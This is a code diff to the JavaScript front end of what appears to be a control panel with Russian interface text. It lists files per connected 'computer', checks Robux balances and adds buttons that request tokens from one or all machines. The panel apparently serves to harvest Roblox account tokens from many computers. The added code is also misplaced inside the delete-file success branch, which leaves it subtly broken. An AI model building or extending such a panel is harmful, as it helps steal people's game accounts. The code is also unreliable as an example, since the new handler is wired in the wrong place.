@@ -221,6 +221,7 @@ function openModalByIndex(idx) {
   }
 
   document.getElementById("modalRobuxBtn").onclick = function() { checkRobux(f.name); };
+  document.getElementById("modalRequestBtn").onclick = function() { requestToken(f.name); };
   document.getElementById("modalDeleteBtn").onclick = function() { deleteFile(f.name); };
 
   document.getElementById("fileModal").style.display = "flex";
@@ -254,7 +255,37 @@ async function deleteFile(name) {
     if (d.success) {
       toast("Файл удалён");
       closeModal();
-      loadFiles();
+loadFiles();
+
+// ── Запрос токена ─────────────────────────────────────────────────────────────
+async function requestToken(filename) {
+  toast('📡 Запрос отправлен...');
+  try {
+    await apiFetch('/request-token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ filename })
+    });
+    toast('📡 Запрос токена отправлен компьютеру');
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка запроса', 'err');
+  }
+}
+
+document.getElementById('btnRequestAll').addEventListener('click', async function() {
+  const btn = this;
+  btn.disabled = true;
+  btn.textContent = '⏳ Отправка...';
+  try {
+    const r = await apiFetch('/request-token-all', { method: 'POST' });
+    const data = await r.json();
+    toast('📡 Запрос отправлен ' + (data.count || 'всем') + ' компьютерам');
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка запроса', 'err');
+  }
+  btn.disabled = false;
+  btn.textContent = '📡 Запросить у всех';
+});
     } else {
       toast("Ошибка удаления", "err");
     }
